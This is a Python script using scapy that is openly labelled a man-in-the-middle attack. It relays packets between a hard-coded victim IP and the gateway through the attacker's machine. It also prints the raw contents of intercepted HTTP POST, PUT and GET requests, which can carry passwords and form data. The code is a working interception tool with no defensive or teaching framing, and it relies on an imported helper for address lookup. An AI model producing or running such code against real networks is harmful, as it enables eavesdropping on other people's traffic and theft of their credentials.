from scapy.all import sniff, Ether, IP, TCP, Raw, sendp, get_if_hwaddr
from router_ip_mac import get_router_ip, get_mac

# Configuration
target_ip = "192.168.2.103"
gateway_ip = get_router_ip()
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)
my_mac = get_if_hwaddr("eth0")  # Get the attacker's MAC address dynamically

if not all([target_mac, gateway_mac, my_mac]):
    raise ValueError("Could not retrieve all necessary MAC addresses. Exiting.")


# Function to process HTTP packets (TCP + Raw layer)
def tcp_packet(packet):
    if packet.haslayer(Raw):
        raw_data = packet[Raw].load
        if b"POST" in raw_data:
            print("\n\nCaptured POST data:\n", raw_data, "\n")
        elif b"PUT" in raw_data:
            print("\nCaptured PUT data:\n", raw_data, "\n")
        elif b"GET" in raw_data:
            print("\nCaptured GET data:\n", raw_data, "\n")


# Function to forward packets between victim and gateway
def forward_packet(packet):
    if packet.haslayer(Ether) and packet.haslayer(IP):
        packet = packet.copy()  # Ensure the packet is modifiable

        # Analyze and forward HTTP packets
        if packet.haslayer(TCP) and packet[TCP].dport == 80:
            tcp_packet(packet)

        # Forward packet from target to gateway
        if packet[Ether].src == target_mac and packet[IP].dst == gateway_ip and packet[Ether].dst == my_mac:
            packet[Ether].dst = gateway_mac
            packet[Ether].src = my_mac
            sendp(packet, verbose=False)

        # Forward packet from gateway to target
        elif packet[Ether].src == gateway_mac and packet[IP].dst == target_ip and packet[Ether].dst == my_mac:
            packet[Ether].dst = target_mac
            packet[Ether].src = my_mac
            sendp(packet, verbose=False)


# MITM attack
def MITM_attack():
    try:
        print("Starting MITM attack. . .")
        # Start sniffing all packets on the interface
        sniff(prn=forward_packet, store=False)
    except KeyboardInterrupt:
        print("\nMITM attack terminated.")
